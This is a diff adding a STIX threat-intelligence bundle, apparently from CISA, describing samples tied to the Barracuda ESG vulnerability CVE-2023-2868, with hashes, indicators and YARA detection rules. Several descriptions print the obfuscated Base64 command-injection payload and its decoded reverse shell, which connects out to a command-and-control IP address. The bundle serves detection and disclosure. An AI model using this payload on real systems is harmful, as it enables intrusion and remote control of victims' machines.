@@ -1,0 +1,1646 @@
+{
+    "type": "bundle",
+    "id": "bundle--bdf720b5-c538-4606-9a88-ea430201bd37",
+    "objects": [
+        {
+            "type": "identity",
+            "spec_version": "2.1",
+            "id": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created_by_ref": "identity--42ac3c92-60d2-418f-ba8e-838944e6110b",
+            "created": "2023-04-12T17:53:09.646Z",
+            "modified": "2023-04-12T17:53:09.646Z",
+            "name": "GeminiProduction_CMA",
+            "description": "Cybersecurity and Infrastructure Security Agency Production Identity. Code and Media Analysis.",
+            "identity_class": "system",
+            "confidence": 100,
+            "lang": "en",
+            "object_marking_refs": [
+                "marking-definition--bab4a63c-aed9-4cf5-a766-dfca5abac2bb"
+            ]
+        },
+        {
+            "type": "file",
+            "spec_version": "2.1",
+            "id": "file--cc5a480d-e70e-55ed-976b-b3ec9bf35390",
+            "hashes": {
+                "MD5": "5bbdcca59916d40c178fd29a743fc9eb",
+                "SHA-1": "4bd4f014ceeffbe2b1e61f5d279416a80ec9eafe",
+                "SHA-256": "2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095",
+                "SHA-512": "17a07d6d3164159ace01099bdee560bd63f980d083b6a1650880b50bcfe63b9eda8b1ba7932c7527457d368005d61745a21fa4252a9e2b81ea3a9a34e4d33ea0",
+                "SSDEEP": "96:e1mfYp+YQicdb34VB+1jhuBj1rH4equdK3b7OKiTcGuRNdecg6dxkXBd6Uq:pW+UOb3QBkjh89H4q6fbP"
+            },
+            "size": 29888,
+            "name": "1665807519-0a151737759a87f0001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--5a013575-f154-4620-9572-d7e5ae85eb81",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "1665807519-0a151737759a87f0001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This file is related to the vulnerability CVE-2023-2868 in the Barracuda ESG exploit to execute a reverse shell payload on certain ESG appliances. This sample contains a Base64 encoded block that upon decoding references multiple archive files. There are multiple file references in the block, however, only one contains the exploit code in the title and can be found between two single quotes and backticks '`abcdefg=payload`' (Figure 1). This payload triggers a command injection and upon successful exploitation of the affected system the encoded commands are able to run and provide the Threat Actor (TA) with a response.\r\n\r\n--Begin Encoded Payload--\r\n'`abcdefg=c2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMDcuMTQ4LjIyMy4xOTY6ODA4MCA+L3RtcC9wIDI+L2Rldi9udWxsO3JtIC90bXAvcCI=;ee=ba;G=s;\"ech\"o $abcdefg|${ee}se64 -d|${G}h;wh66489.txt`'\r\n--End Encoded Payload--\r\n\r\nThe encoded block above decodes to a reverse shell seen below.\r\n\r\n--Begin Decoded Command--\r\nsetsid sh -c \"mkfifo /tmp/p;sh -i </tmp/p 2>&1|openssl s_client -quiet -connect 107.148.223.196:8080 >/tmp/p 2>/dev/null;rm /tmp/p\"\r\n--End Decoded Command--\r\n\r\nThis reverse shell starts a new session and sets it to run in the background. Then it creates the named pipe \"/tmp/p\" that it will use as a point to transfer the commands that will be executed. \r\n\r\nThe rest of the command is seen using OpenSSL to create a client that connects to the Command-and-Control (C2) at Internet Protocol (IP) address \u201c107.148.223.196\u201d and port number \u201c8080.\u201d The OpenSSL command also suppresses session and certificate output info using -quiet flag and errors are discarded for stealth in the /dev/null directory. Finally, the named pipe \"tmp/p\" is removed when the OpenSSL connection is closed.",
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": " 'namespace'='CISA_Consolidated.yara' rule_name=CISA_10454006_08 rule_content=rule CISA_10454006_08 : trojan backdoor remote_access_trojan accesses_remote_machines communicates_with_c2\n{\n\tmeta:\n\t\tAuthor = \"CISA Code & Media Analysis\"\n\t\tIncident = \"10454006\"\n\t\tDate = \"2023-07-05\"\n\t\tLast_Modified = \"20230712_1400\"\n\t\tActor = \"n/a\"\n\t\tFamily = \"n/a\"\n\t\tCapabilities = \"accesses-remote-machines communicates-with-c2\"\n\t\tMalware_Type = \"trojan backdoor remote-access-trojan\"\n\t\tTool_Type = \"unknown\"\n\t\tDescription = \"Detects reverse shell samples in TAR files used in CVE-2023-2868 encoded block\"\n\t\tSHA256_1 = \"0b917d945a7491869fa5003f6b85c09f5f45795a7852a8b63ba1abdc9797d6a6\"\n\t\tSHA256_2 = \"2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095\"\n\t\tSHA256_3 = \"3f2ca19ad3635f379968b0302c7e42cf954f85ab61166c6f70acfebc72f38ab7\"\n\t\tSHA256_4 = \"80342108e9f0f1fd6b5c44e88006cebe37e4eccb3a0f567636b22ad210c0a043\"\n\t\tSHA256_5 = \"9d0c7a45dd00d31a9724fa9e96cb8ac99dd5a6502fe4515cedaabb2e58b1c5f5\"\n\t\tSHA256_6 = \"b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321\"\n\t\tSHA256_7 = \"b52a9844d8368abe70b6ba0d8df84f88c8c0029dcbcf599665acd703b255d5d2\"\n\t\tSHA256_8 = \"caa795c4c934219d287379b20c2912af0f815de95bb73e0f02f5fe6eb9aa50bd\"\n\t\tSHA256_9 = \"cf0996a3aee148bc060f4726435dd0d7f1af79082277f407dfa07d81181322ba\"\n\t\tSHA256_10 = \"f536a7b75b7205762b75a037ebf6503029aab1a02afab14b2709797c32e7e0fa\"\n\tstrings:\n\t\t$s1 = { 59 57 4a 6a 5a 47 56 6d 5a }\n\t\t$s2 = { 59 7a 4a 57 4d 47 4d 79 62 47 74 4a 53 45 35 76 53 55 4d 78 61 }\n\t\t$s3 = { 54 44 4e 53 64 47 4e 44 4f }\n\t\t$s4 = { 5a 45 63 78 64 }\n\t\t$s5 = { 57 54 49 35 64 57 4a 74 56 6d 70 6b }\n\t\t$s6 = { 53 55 52 4a 4b 30 77 79 55 6d 78 6b 61 54 6c 31 5a 46 64 34 63 }\n\t\t$s7 = { 4c 6e 52 34 64 41 }\n\tcondition:\n\t\t5 of them\n}\n",
+            "pattern_type": "yara",
+            "valid_from": "2023-07-27T20:32:53.054213Z"
+        },
+        {
+            "type": "malware-analysis",
+            "spec_version": "2.1",
+            "id": "malware-analysis--e59fb0c6-3de0-431e-bdce-2bc215a98d45",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "product": "eset",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "result_name": "Linux/Exploit.CVE-2023-2868.A trojan",
+            "result": "unknown",
+            "sample_ref": "file--cc5a480d-e70e-55ed-976b-b3ec9bf35390"
+        },
+        {
+            "type": "malware",
+            "spec_version": "2.1",
+            "id": "malware--0592ee79-5a16-42a2-a2bb-1d58124d3e1b",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This file is related to the vulnerability CVE-2023-2868 in the Barracuda ESG exploit to execute a reverse shell payload on certain ESG appliances. This sample contains a Base64 encoded block that upon decoding references multiple archive files. There are multiple file references in the block, however, only one contains the exploit code in the title and can be found between two single quotes and backticks '`abcdefg=payload`' (Figure 1). This payload triggers a command injection and upon successful exploitation of the affected system the encoded commands are able to run and provide the Threat Actor (TA) with a response.\r\n\r\n--Begin Encoded Payload--\r\n'`abcdefg=c2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMDcuMTQ4LjIyMy4xOTY6ODA4MCA+L3RtcC9wIDI+L2Rldi9udWxsO3JtIC90bXAvcCI=;ee=ba;G=s;\"ech\"o $abcdefg|${ee}se64 -d|${G}h;wh66489.txt`'\r\n--End Encoded Payload--\r\n\r\nThe encoded block above decodes to a reverse shell seen below.\r\n\r\n--Begin Decoded Command--\r\nsetsid sh -c \"mkfifo /tmp/p;sh -i </tmp/p 2>&1|openssl s_client -quiet -connect 107.148.223.196:8080 >/tmp/p 2>/dev/null;rm /tmp/p\"\r\n--End Decoded Command--\r\n\r\nThis reverse shell starts a new session and sets it to run in the background. Then it creates the named pipe \"/tmp/p\" that it will use as a point to transfer the commands that will be executed. \r\n\r\nThe rest of the command is seen using OpenSSL to create a client that connects to the Command-and-Control (C2) at Internet Protocol (IP) address \u201c107.148.223.196\u201d and port number \u201c8080.\u201d The OpenSSL command also suppresses session and certificate output info using -quiet flag and errors are discarded for stealth in the /dev/null directory. Finally, the named pipe \"tmp/p\" is removed when the OpenSSL connection is closed.",
+            "malware_types": [
+                "trojan",
+                "backdoor"
+            ],
+            "is_family": false,
+            "sample_refs": [
+                "file--cc5a480d-e70e-55ed-976b-b3ec9bf35390"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--58a37093-e2a6-432d-9143-de09cdd82892",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "1665807519-0a151737759a87f0001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": "[file:hashes.'MD5'='5bbdcca59916d40c178fd29a743fc9eb' OR file:hashes.'SHA-1'='4bd4f014ceeffbe2b1e61f5d279416a80ec9eafe' OR file:hashes.'SHA-256'='2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095' OR file:hashes.'SHA-512'='17a07d6d3164159ace01099bdee560bd63f980d083b6a1650880b50bcfe63b9eda8b1ba7932c7527457d368005d61745a21fa4252a9e2b81ea3a9a34e4d33ea0']",
+            "pattern_type": "stix",
+            "pattern_version": "2.1",
+            "valid_from": "2023-07-27T20:32:53.09359Z"
+        },
+        {
+            "type": "file",
+            "spec_version": "2.1",
+            "id": "file--eb79b38d-e5a0-5de9-94d5-817b11bac3ea",
+            "hashes": {
+                "MD5": "1424d7cf2515f97e21bbd9c94d187dab",
+                "SHA-1": "f7df6eb42ce9979babbd9fb1373bbf260dcfe4e5",
+                "SHA-256": "cf0996a3aee148bc060f4726435dd0d7f1af79082277f407dfa07d81181322ba",
+                "SHA-512": "febc0f0bee4b8a4209a7768cf2285550b571506f9d56ffbdf5a262f81d4e28df38e8e78691f05ee408ef464715e213602860332e638d28e0976e56a8fc587662",
+                "SSDEEP": "96:i1mJ5p+Yuicd4344D+7jhugE1rH4equdK3b7OKiTcGuRNdecg6dxkXBd6UH:7j+yO435DOjhu9H4q6fbC"
+            },
+            "size": 29887,
+            "name": "1665808153-0a1517307c0bb70001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--cbedaf71-1da8-4c1e-a0c9-fd440a497b51",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "1665808153-0a1517307c0bb70001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This artifact contains the same payloads as \u201c2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095.\u201d",
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": " 'namespace'='CISA_Consolidated.yara' rule_name=CISA_10454006_08 rule_content=rule CISA_10454006_08 : trojan backdoor remote_access_trojan accesses_remote_machines communicates_with_c2\n{\n\tmeta:\n\t\tAuthor = \"CISA Code & Media Analysis\"\n\t\tIncident = \"10454006\"\n\t\tDate = \"2023-07-05\"\n\t\tLast_Modified = \"20230712_1400\"\n\t\tActor = \"n/a\"\n\t\tFamily = \"n/a\"\n\t\tCapabilities = \"accesses-remote-machines communicates-with-c2\"\n\t\tMalware_Type = \"trojan backdoor remote-access-trojan\"\n\t\tTool_Type = \"unknown\"\n\t\tDescription = \"Detects reverse shell samples in TAR files used in CVE-2023-2868 encoded block\"\n\t\tSHA256_1 = \"0b917d945a7491869fa5003f6b85c09f5f45795a7852a8b63ba1abdc9797d6a6\"\n\t\tSHA256_2 = \"2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095\"\n\t\tSHA256_3 = \"3f2ca19ad3635f379968b0302c7e42cf954f85ab61166c6f70acfebc72f38ab7\"\n\t\tSHA256_4 = \"80342108e9f0f1fd6b5c44e88006cebe37e4eccb3a0f567636b22ad210c0a043\"\n\t\tSHA256_5 = \"9d0c7a45dd00d31a9724fa9e96cb8ac99dd5a6502fe4515cedaabb2e58b1c5f5\"\n\t\tSHA256_6 = \"b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321\"\n\t\tSHA256_7 = \"b52a9844d8368abe70b6ba0d8df84f88c8c0029dcbcf599665acd703b255d5d2\"\n\t\tSHA256_8 = \"caa795c4c934219d287379b20c2912af0f815de95bb73e0f02f5fe6eb9aa50bd\"\n\t\tSHA256_9 = \"cf0996a3aee148bc060f4726435dd0d7f1af79082277f407dfa07d81181322ba\"\n\t\tSHA256_10 = \"f536a7b75b7205762b75a037ebf6503029aab1a02afab14b2709797c32e7e0fa\"\n\tstrings:\n\t\t$s1 = { 59 57 4a 6a 5a 47 56 6d 5a }\n\t\t$s2 = { 59 7a 4a 57 4d 47 4d 79 62 47 74 4a 53 45 35 76 53 55 4d 78 61 }\n\t\t$s3 = { 54 44 4e 53 64 47 4e 44 4f }\n\t\t$s4 = { 5a 45 63 78 64 }\n\t\t$s5 = { 57 54 49 35 64 57 4a 74 56 6d 70 6b }\n\t\t$s6 = { 53 55 52 4a 4b 30 77 79 55 6d 78 6b 61 54 6c 31 5a 46 64 34 63 }\n\t\t$s7 = { 4c 6e 52 34 64 41 }\n\tcondition:\n\t\t5 of them\n}\n",
+            "pattern_type": "yara",
+            "valid_from": "2023-07-27T20:32:53.313768Z"
+        },
+        {
+            "type": "malware-analysis",
+            "spec_version": "2.1",
+            "id": "malware-analysis--0e84a2d3-c303-4ddc-9aa5-653e63bc8c85",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "product": "eset",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "result_name": "Linux/Exploit.CVE-2023-2868.A trojan",
+            "result": "unknown",
+            "sample_ref": "file--eb79b38d-e5a0-5de9-94d5-817b11bac3ea"
+        },
+        {
+            "type": "malware",
+            "spec_version": "2.1",
+            "id": "malware--5c41a2ad-4831-465f-9767-a455217efa4a",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This artifact contains the same payloads as \u201c2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095.\u201d",
+            "malware_types": [
+                "trojan",
+                "backdoor"
+            ],
+            "is_family": false,
+            "sample_refs": [
+                "file--eb79b38d-e5a0-5de9-94d5-817b11bac3ea"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--54db3a24-604b-41d6-a278-0ab018f449b0",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "1665808153-0a1517307c0bb70001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": "[file:hashes.'MD5'='1424d7cf2515f97e21bbd9c94d187dab' OR file:hashes.'SHA-1'='f7df6eb42ce9979babbd9fb1373bbf260dcfe4e5' OR file:hashes.'SHA-256'='cf0996a3aee148bc060f4726435dd0d7f1af79082277f407dfa07d81181322ba' OR file:hashes.'SHA-512'='febc0f0bee4b8a4209a7768cf2285550b571506f9d56ffbdf5a262f81d4e28df38e8e78691f05ee408ef464715e213602860332e638d28e0976e56a8fc587662']",
+            "pattern_type": "stix",
+            "pattern_version": "2.1",
+            "valid_from": "2023-07-27T20:32:53.317821Z"
+        },
+        {
+            "type": "file",
+            "spec_version": "2.1",
+            "id": "file--9d1f6135-3eac-5349-a928-8dabc7ba22c0",
+            "hashes": {
+                "MD5": "bd238e645c350329b0a42264dc6fdea7",
+                "SHA-1": "f61238d4bbe1927e827ffd03457c1d60b1ce6350",
+                "SHA-256": "caa795c4c934219d287379b20c2912af0f815de95bb73e0f02f5fe6eb9aa50bd",
+                "SHA-512": "fc298c3cee79f2d965d8464746dea4259209bd5f7bb4ee2825e92ca1fad2b65c9b02d93406da8de1c7f2e3e0a08b2a430f95b0b55e009f2ff71e0f4fa6305f52",
+                "SSDEEP": "96:71mv1p+YQicdcs45k+Ujhu0w1rH4equdK3b7OKiTcGuRNdecg6dxkXBd6Ujn:6X+0OcsQkNjhe9H4q6fb2"
+            },
+            "size": 29887,
+            "name": "1665808277-0a1517307c0bbc0001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--a3b423d4-4234-49a9-b123-bcadfb8c6054",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "1665808277-0a1517307c0bbc0001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This artifact contains the same payloads as \u201c2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095.\u201d",
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": " 'namespace'='CISA_Consolidated.yara' rule_name=CISA_10454006_08 rule_content=rule CISA_10454006_08 : trojan backdoor remote_access_trojan accesses_remote_machines communicates_with_c2\n{\n\tmeta:\n\t\tAuthor = \"CISA Code & Media Analysis\"\n\t\tIncident = \"10454006\"\n\t\tDate = \"2023-07-05\"\n\t\tLast_Modified = \"20230712_1400\"\n\t\tActor = \"n/a\"\n\t\tFamily = \"n/a\"\n\t\tCapabilities = \"accesses-remote-machines communicates-with-c2\"\n\t\tMalware_Type = \"trojan backdoor remote-access-trojan\"\n\t\tTool_Type = \"unknown\"\n\t\tDescription = \"Detects reverse shell samples in TAR files used in CVE-2023-2868 encoded block\"\n\t\tSHA256_1 = \"0b917d945a7491869fa5003f6b85c09f5f45795a7852a8b63ba1abdc9797d6a6\"\n\t\tSHA256_2 = \"2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095\"\n\t\tSHA256_3 = \"3f2ca19ad3635f379968b0302c7e42cf954f85ab61166c6f70acfebc72f38ab7\"\n\t\tSHA256_4 = \"80342108e9f0f1fd6b5c44e88006cebe37e4eccb3a0f567636b22ad210c0a043\"\n\t\tSHA256_5 = \"9d0c7a45dd00d31a9724fa9e96cb8ac99dd5a6502fe4515cedaabb2e58b1c5f5\"\n\t\tSHA256_6 = \"b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321\"\n\t\tSHA256_7 = \"b52a9844d8368abe70b6ba0d8df84f88c8c0029dcbcf599665acd703b255d5d2\"\n\t\tSHA256_8 = \"caa795c4c934219d287379b20c2912af0f815de95bb73e0f02f5fe6eb9aa50bd\"\n\t\tSHA256_9 = \"cf0996a3aee148bc060f4726435dd0d7f1af79082277f407dfa07d81181322ba\"\n\t\tSHA256_10 = \"f536a7b75b7205762b75a037ebf6503029aab1a02afab14b2709797c32e7e0fa\"\n\tstrings:\n\t\t$s1 = { 59 57 4a 6a 5a 47 56 6d 5a }\n\t\t$s2 = { 59 7a 4a 57 4d 47 4d 79 62 47 74 4a 53 45 35 76 53 55 4d 78 61 }\n\t\t$s3 = { 54 44 4e 53 64 47 4e 44 4f }\n\t\t$s4 = { 5a 45 63 78 64 }\n\t\t$s5 = { 57 54 49 35 64 57 4a 74 56 6d 70 6b }\n\t\t$s6 = { 53 55 52 4a 4b 30 77 79 55 6d 78 6b 61 54 6c 31 5a 46 64 34 63 }\n\t\t$s7 = { 4c 6e 52 34 64 41 }\n\tcondition:\n\t\t5 of them\n}\n",
+            "pattern_type": "yara",
+            "valid_from": "2023-07-27T20:32:53.337933Z"
+        },
+        {
+            "type": "malware-analysis",
+            "spec_version": "2.1",
+            "id": "malware-analysis--0a6a6b76-5a4a-487a-b5c2-d5f0eca3eb3c",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "product": "eset",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "result_name": "Linux/Exploit.CVE-2023-2868.A trojan",
+            "result": "unknown",
+            "sample_ref": "file--9d1f6135-3eac-5349-a928-8dabc7ba22c0"
+        },
+        {
+            "type": "malware",
+            "spec_version": "2.1",
+            "id": "malware--ed86b905-12fd-45e3-9029-9eb0c0a219bd",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This artifact contains the same payloads as \u201c2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095.\u201d",
+            "malware_types": [
+                "trojan",
+                "backdoor"
+            ],
+            "is_family": false,
+            "sample_refs": [
+                "file--9d1f6135-3eac-5349-a928-8dabc7ba22c0"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--d72738dd-c80d-4c05-a749-ee6be440b5dd",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "1665808277-0a1517307c0bbc0001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": "[file:hashes.'MD5'='bd238e645c350329b0a42264dc6fdea7' OR file:hashes.'SHA-1'='f61238d4bbe1927e827ffd03457c1d60b1ce6350' OR file:hashes.'SHA-256'='caa795c4c934219d287379b20c2912af0f815de95bb73e0f02f5fe6eb9aa50bd' OR file:hashes.'SHA-512'='fc298c3cee79f2d965d8464746dea4259209bd5f7bb4ee2825e92ca1fad2b65c9b02d93406da8de1c7f2e3e0a08b2a430f95b0b55e009f2ff71e0f4fa6305f52']",
+            "pattern_type": "stix",
+            "pattern_version": "2.1",
+            "valid_from": "2023-07-27T20:32:53.341728Z"
+        },
+        {
+            "type": "file",
+            "spec_version": "2.1",
+            "id": "file--7a6c4f8e-086e-5b3d-9c6b-ba5483492f1a",
+            "hashes": {
+                "MD5": "3e01f48ab1bfae888b2c580dbc6c5962",
+                "SHA-1": "6f7d8d31d1d0c53d71495176aa4ab23756bbba24",
+                "SHA-256": "0b917d945a7491869fa5003f6b85c09f5f45795a7852a8b63ba1abdc9797d6a6",
+                "SHA-512": "ea5b2437c99c766050fddc2cad00b3d863ceae41d7d0be2b67ded74b146800de2ef7261d003d1bb341a8cff4ddd789f2c615daa423d9ab2a7f04b3a1d353d2eb",
+                "SSDEEP": "96:+1mAIp+Y/icd7s42dB+1jhPBD1rH4equdK3b7OKiTcGuRNdecg6dxkXBd6Ua:em+ZO7sfBkjh79H4q6fbf"
+            },
+            "size": 29888,
+            "name": "1665808485-0a151737759a8a30001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--c876d426-d1ef-4d62-8455-bd453a42ed5a",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "1665808485-0a151737759a8a30001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This artifact contains the same payloads as \u201c2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095.\u201d",
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": " 'namespace'='CISA_Consolidated.yara' rule_name=CISA_10454006_08 rule_content=rule CISA_10454006_08 : trojan backdoor remote_access_trojan accesses_remote_machines communicates_with_c2\n{\n\tmeta:\n\t\tAuthor = \"CISA Code & Media Analysis\"\n\t\tIncident = \"10454006\"\n\t\tDate = \"2023-07-05\"\n\t\tLast_Modified = \"20230712_1400\"\n\t\tActor = \"n/a\"\n\t\tFamily = \"n/a\"\n\t\tCapabilities = \"accesses-remote-machines communicates-with-c2\"\n\t\tMalware_Type = \"trojan backdoor remote-access-trojan\"\n\t\tTool_Type = \"unknown\"\n\t\tDescription = \"Detects reverse shell samples in TAR files used in CVE-2023-2868 encoded block\"\n\t\tSHA256_1 = \"0b917d945a7491869fa5003f6b85c09f5f45795a7852a8b63ba1abdc9797d6a6\"\n\t\tSHA256_2 = \"2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095\"\n\t\tSHA256_3 = \"3f2ca19ad3635f379968b0302c7e42cf954f85ab61166c6f70acfebc72f38ab7\"\n\t\tSHA256_4 = \"80342108e9f0f1fd6b5c44e88006cebe37e4eccb3a0f567636b22ad210c0a043\"\n\t\tSHA256_5 = \"9d0c7a45dd00d31a9724fa9e96cb8ac99dd5a6502fe4515cedaabb2e58b1c5f5\"\n\t\tSHA256_6 = \"b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321\"\n\t\tSHA256_7 = \"b52a9844d8368abe70b6ba0d8df84f88c8c0029dcbcf599665acd703b255d5d2\"\n\t\tSHA256_8 = \"caa795c4c934219d287379b20c2912af0f815de95bb73e0f02f5fe6eb9aa50bd\"\n\t\tSHA256_9 = \"cf0996a3aee148bc060f4726435dd0d7f1af79082277f407dfa07d81181322ba\"\n\t\tSHA256_10 = \"f536a7b75b7205762b75a037ebf6503029aab1a02afab14b2709797c32e7e0fa\"\n\tstrings:\n\t\t$s1 = { 59 57 4a 6a 5a 47 56 6d 5a }\n\t\t$s2 = { 59 7a 4a 57 4d 47 4d 79 62 47 74 4a 53 45 35 76 53 55 4d 78 61 }\n\t\t$s3 = { 54 44 4e 53 64 47 4e 44 4f }\n\t\t$s4 = { 5a 45 63 78 64 }\n\t\t$s5 = { 57 54 49 35 64 57 4a 74 56 6d 70 6b }\n\t\t$s6 = { 53 55 52 4a 4b 30 77 79 55 6d 78 6b 61 54 6c 31 5a 46 64 34 63 }\n\t\t$s7 = { 4c 6e 52 34 64 41 }\n\tcondition:\n\t\t5 of them\n}\n",
+            "pattern_type": "yara",
+            "valid_from": "2023-07-27T20:32:53.360529Z"
+        },
+        {
+            "type": "malware-analysis",
+            "spec_version": "2.1",
+            "id": "malware-analysis--b82ddc66-74bf-4b3c-b370-03fe37a1fcac",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "product": "eset",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "result_name": "Linux/Exploit.CVE-2023-2868.A trojan",
+            "result": "unknown",
+            "sample_ref": "file--7a6c4f8e-086e-5b3d-9c6b-ba5483492f1a"
+        },
+        {
+            "type": "malware",
+            "spec_version": "2.1",
+            "id": "malware--4a271788-6138-4f9b-a67a-cb5ce3c1dca5",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
